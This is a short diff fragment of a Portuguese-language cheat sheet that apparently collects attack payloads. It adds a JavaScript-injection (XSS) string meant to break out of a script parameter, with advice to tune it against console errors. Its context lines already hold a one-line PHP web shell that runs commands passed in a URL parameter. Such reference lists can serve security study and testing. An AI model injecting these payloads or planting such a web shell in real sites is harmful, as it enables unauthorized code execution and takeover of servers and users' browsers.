@@ -125,6 +125,10 @@ PAGINA CONTENDO [OUTROS](https://ygoralberto.github.io/outros) COMANDOS DE WINDO
 
 .
 
+	?param=1';alert(1)//  | USAR EM UM CENARIO EM QUE O PARAMETRO EXECUTA ALGO DENTRO DE UM SCRIPT. ANALISAR E AJUSTAR O CODIGO DE ACORDO. OBSERVAR ERRO NO CONSOLE
+
+.
+
 	<?php system($_GET['hacker']);?>
 	
 .
